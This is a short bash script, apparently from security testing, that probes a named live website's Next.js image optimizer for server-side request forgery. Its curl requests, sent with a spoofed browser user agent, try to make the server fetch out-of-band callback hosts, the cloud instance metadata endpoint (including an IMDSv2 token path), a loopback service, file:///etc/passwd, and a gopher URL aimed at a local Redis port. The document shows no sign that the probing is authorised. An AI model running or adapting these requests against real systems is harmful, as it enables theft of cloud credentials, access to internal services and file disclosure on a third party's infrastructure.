#!/bin/bash
# SSRF probe against live Next.js image optimizer at /_next/image
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
B='https://www.infinitycapital.bh/_next/image'
H1=oob7db69b751494.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in
H2=oob633cdc66b143.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in

echo "--- [1] external OOB host direct"
curl -sk -A "$UA" -o /dev/null -w "code=%{http_code} size=%{size_download} ct=%{content_type}\n" \
  "$B?url=http%3A%2F%2F$H1%2Fssrf1.png&w=640&q=75"

echo "--- [2] external OOB host .svg"
curl -sk -A "$UA" -o /dev/null -w "code=%{http_code} size=%{size_download} ct=%{content_type}\n" \
  "$B?url=http%3A%2F%2F$H1%2Fssrf2.svg&w=640&q=75"

echo "--- [3] cloud metadata (IMDSv1)"
curl -sk -A "$UA" -o /tmp/imds.txt -w "code=%{http_code} size=%{size_download}\n" \
  "$B?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F&w=640&q=75"
head -c 400 /tmp/imds.txt; echo

echo "--- [4] IMDSv2 token"
curl -sk -A "$UA" -o /dev/null -w "code=%{http_code} size=%{size_download}\n" \
  "$B?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fapi%2Ftoken&w=640&q=75"

echo "--- [5] internal loopback"
curl -sk -A "$UA" -o /tmp/loop.txt -w "code=%{http_code} size=%{size_download}\n" \
  "$B?url=http%3A%2F%2F127.0.0.1%3A3000%2F&w=640&q=75"
head -c 300 /tmp/loop.txt; echo

echo "--- [6] internal self (re-fetch our own homepage = confirm fetch+render)"
curl -sk -A "$UA" -o /dev/null -w "code=%{http_code} size=%{size_download} ct=%{content_type}\n" \
  "$B?url=https%3A%2F%2Fwww.infinitycapital.bh%2F&w=640&q=75"

echo "--- [7] file scheme"
curl -sk -A "$UA" -o /dev/null -w "code=%{http_code} size=%{size_download}\n" \
  "$B?url=file%3A%2F%2F%2Fetc%2Fpasswd&w=640&q=75"

echo "--- [8] gopher"
curl -sk -A "$UA" -o /dev/null -w "code=%{http_code} size=%{size_download}\n" \
  "$B?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_INFOCR1&w=640&q=75"

echo "--- [9] second minted host via redirect-style path"
curl -sk -A "$UA" -o /dev/null -w "code=%{http_code} size=%{size_download}\n" \
  "$B?url=http%3A%2F%2F$H2%2Fssrf9.png&w=640&q=75"

echo "--- [10] control: token never sent to target (should stay silent)"
echo "control token = oob7db69b751494 unused-path-control"
